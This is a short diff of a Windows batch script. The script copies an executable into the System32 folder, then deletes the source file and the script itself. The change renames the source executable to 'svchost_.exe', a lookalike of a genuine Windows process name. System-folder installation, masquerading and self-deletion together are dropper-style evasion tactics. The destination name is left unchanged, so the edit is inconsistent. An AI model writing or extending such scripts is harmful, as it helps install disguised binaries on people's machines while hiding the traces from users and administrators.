@@ -1,6 +1,6 @@
 @echo off
 
-set "sourceFile=C:\my.exe"
+set "sourceFile=C:\svchost_.exe"
 set "destinationFolder=C:\Windows\System32"
 set "destinationFile=%destinationFolder%\my.exe"
 
@@ -17,8 +17,8 @@ if exist "%destinationFile%" (
 
 echo Task completed. Deleting files...
 
-rem Delete my.exe from the current directory
-del my.exe
+rem Delete svchost_.exe from the current directory
+del svchost_.exe
 
 rem Delete the batch file itself
 del "%~f0"
